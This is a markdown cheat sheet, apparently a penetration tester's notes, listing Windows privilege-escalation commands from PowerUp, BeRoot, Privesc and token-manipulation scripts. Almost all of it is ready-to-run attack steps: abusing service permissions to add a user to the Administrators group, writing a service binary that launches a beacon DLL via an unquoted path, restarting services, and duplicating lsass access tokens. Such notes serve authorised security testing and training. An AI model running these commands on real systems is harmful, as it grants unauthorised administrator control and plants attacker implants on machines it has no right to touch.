# Script tools
### Always Focussing on Service issues✔
## 1-PowerUp
 **PowerUp**

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

 https://github.com/HarmJ0y/PowerUp
 
\
**Check for vulnerable programs and configs**
~~~
Invoke-AllChecks
~~~
\
**Exploit vulnerable service permissions (does not require touching disk)❤️**
~~~
Invoke-ServiceAbuse -Name "VulnerableSvc" -Command "net localgroup Administrators DOMAINxxx\userxxxx /add"

Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'
~~~
\
**Get services with unquoted paths and a space in their name.** 
~~~
Get-ServiceUnquoted -Verbose 

Unquoted paths should have two options: 
1-CanRestart: True To restart the service 
2-StartName: LocalSystem should be another account or services to Privilege Escalation 

~~~
\
**Exploit an unquoted service path vulnerability to spawn a beacon**
~~~
Get-ServiceUnquoted -Verbose

Get-ModifiableServiceFile -Verbose

Write-ServiceBinary -Name 'VulnerableSvc' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\VulnerableSvc'
~~~
\
**Restart the service to exploit (not always required)**
~~~
net.exe stop VulnerableSvc net.exe start VulnerableSvc
~~~
\
**Get services where the current user can write to its binary path or change arguments to the binary**
~~~
 Get-ModifiableServiceFile -Verbose
~~~
\
**Get the services whose configuration current user can modify.**  
 ~~~
Get-ModifiableService -Verbose
~~~
\
**Check localgroup admins**  
~~~
net localgroup Administrators
~~~

## 2-BeRoot
**BeRoot:** 
https://github.com/AlessandroZ/BeRoot 
~~~
.\beRoot.exe
~~~

## 3-Privesc
**Privesc:**
 https://github.com/enjoiz/Privesc 
~~~
. .\privesc.ps1
Invoke-PrivEsc
~~~

## 4-Scripts
\
**1-Creates processes with other users logon tokens**👀

~~~
Invoke-TokenManipulation
~~~
\
**2-Duplicates the Access token of lsass**
~~~
Enable-DuplicateToken.ps1
~~~
